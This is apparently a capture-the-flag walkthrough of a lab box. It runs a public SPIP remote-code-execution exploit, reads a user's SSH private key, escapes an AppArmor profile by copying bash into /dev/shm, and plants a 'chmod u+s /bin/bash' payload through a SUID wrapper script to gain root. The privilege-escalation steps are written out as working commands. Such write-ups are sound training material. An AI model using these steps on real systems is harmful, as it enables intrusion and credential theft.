---
layout: post
author: d3r3lict
tags: [spip, apparmor, suid]
---
# Initial Access
Let's start with basic nmap enumeration.
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 18:21 UTC
Nmap scan report for 10.10.79.30
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
```
If we visit the website we can clearly see it's running spip. 
There was a huge hint in room description. It says "Through a series of enumeration techniques, including directory fuzzing and version identification, `a vulnerability is discovered`, allowing for `Remote Code Execution (RCE)`". Using `searchsploit` we can find out that there is only two known RCE vulnerabilities against SPIP. One of them says `"SPIP v4.2.0 - Remote Code Execution (Unauthenticated)"`. Let's test it, because we don't have any credentials yet. The exploit from exploitdb didn't work, but when we google the CVE number we can find one more exploit, [This one][working-exploit]. So let's get that exploit to our machine and run it against the target.
```
└─$ python3 exploit.py -u http://10.10.79.30/spip/
[+] The Target http://10.10.79.30/spip/ is vulnerable
[!] Spawning interactive shell
[!] Shell spawned successfully. Ensure to re-type commands in the event they do not provide output.
```
We got very limited shell, so let's get a better one.
First of all, let's try to grab an id_rsa. Running `cat /etc/passwd` or `ls /home` we notice there is a user named `think`. Running `cat /home/think/.ssh/id_rsa` reveals the key, so we can log in via ssh.
Copy the key to your local machine, save it into a file and log in.
```
chmod 0600 <KEY_FILENAME>
```
```
ssh think@MACHINE_IP
```
Here we got the user flag. Easy, right?

# Root flag
I was really struggling for this one.
Enumerating `SUID binaries` we can find an uncommon binary `/usr/sbin/run_container`. While testing its functionality you'll see the following error.
```
/opt/run_container.sh: line 16: validate_container_id: command not found
```
Then you will be able to view its source code. 
```
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                    echo "No enough containers are currently running."
                    exit 1
                fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
```
As we can see it is using `docker` command without specifying the full path, so maybe we could create a `docker` file containing the revshell?
```
think@publisher:/opt$ touch docker
touch: cannot touch 'docker': Permission denied
```
Well, maybe we could change the `PATH`? We can actually do that, but we aren't able to write in most of directories. In `most` of...
Here was the problem for me. Let's check the hint.
`Look to the App Armor by it's profile.`
Doing some research I found out that Apparmor profiles are stored in `/etc/apparmor.d` directory. There we can find a profile named `usr.sbin.ash` which is limiting out shell.
```
think@publisher:/opt$ cat /etc/apparmor.d/usr.sbin.ash 
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```
According to output we have write permissions in `/dev/shm` and `/var/tmp`. We can use these directories to bypass `apparmor`. 
Just copy `/bin/bash` to `/dev/shm` and run it. Now you are using `bash` shell instead of `ash`, so no more limits from `apparmor`.
Now you can insert your payload into `/opt/run_container.sh` file.
```
think@publisher:/dev/shm$ echo 'chmod u+s /bin/bash' > run_container.sh
```
Let's run `/usr/sbin/run_container` and see what happens.
Nothing? Well, looks like it works. Let's make sure /bin/bash has suid bit now.
```
think@publisher:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
Yeah, that's it. Now we can run `/bin/bash -p` and get the root flag :)

Tysm for reading this writeup, stay tuned <3


[working-exploit]: https://github.com/0SPwn/CVE-2023-27372-PoC
